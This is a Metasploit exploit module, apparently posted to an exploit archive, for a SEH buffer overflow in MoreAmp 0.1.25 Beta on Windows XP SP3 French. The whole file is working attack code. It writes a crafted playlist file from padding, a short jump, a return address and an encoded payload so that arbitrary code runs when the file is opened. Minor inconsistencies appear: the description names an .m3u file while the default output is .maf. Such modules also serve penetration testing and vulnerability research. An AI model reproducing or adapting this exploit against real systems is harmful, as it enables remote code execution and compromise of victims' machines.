MoreAmp SEH Buffer Overflow (meta)
==================================


#MoreAmp Seh Buffer Overflow (meta)
#Greetz:His0k4 , Bibi-info , Volc4n0
#sec4ever.com
require &#039;msf/core&#039;
  
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
  
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039; => &#039;MoreAmp 0.1.25 Beta Buffer Overflow (SEH)&#039;,
            &#039;Description&#039; => %q{
                This module exploits a SEH overflow in 0.1.25 MoreAmp Beta
            By creating a specially crafted .m3u file, an an attacker may be able
            to execute arbitrary code.
            },
            &#039;License&#039; => MSF_LICENSE,
            &#039;Author&#039; => &#039;MadjiX&#039;,
            &#039;Version&#039; => &#039;Version 1&#039;,
            &#039;References&#039; =>
                [
                    [ &#039;OSVDB&#039;, &#039;65789&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/13942/&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039; =>
                {
                    &#039;Space&#039; => 1400,
                    &#039;BadChars&#039; => "\x00\x20\x0a\x0d",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039; =>
                [
                    [ &#039;Windows XP SP3 Fr&#039;, { &#039;Ret&#039; => 0x7C86467B} ], # 0x7C86467B jmp esp kernel.32
  
                ],
            &#039;Privileged&#039; => false,
            &#039;DisclosureDate&#039;  => &#039;17-07-2010&#039;,
            &#039;DefaultTarget&#039; => 0))
  
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;MadjiX.maf&#039;]),
            ], self.class)
    end
  
  
    def exploit
  
        sploit = rand_text_alphanumeric(108)
        sploit << "\xeb\x06\x90\x90"
        sploit << [target.ret].pack(&#039;V&#039;)
        sploit << payload.encoded
        sploit << rand_text_alphanumeric(400 - payload.encoded.length)
  
        maffile = sploit
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
        file_create(maffile)
  
    end
  
end



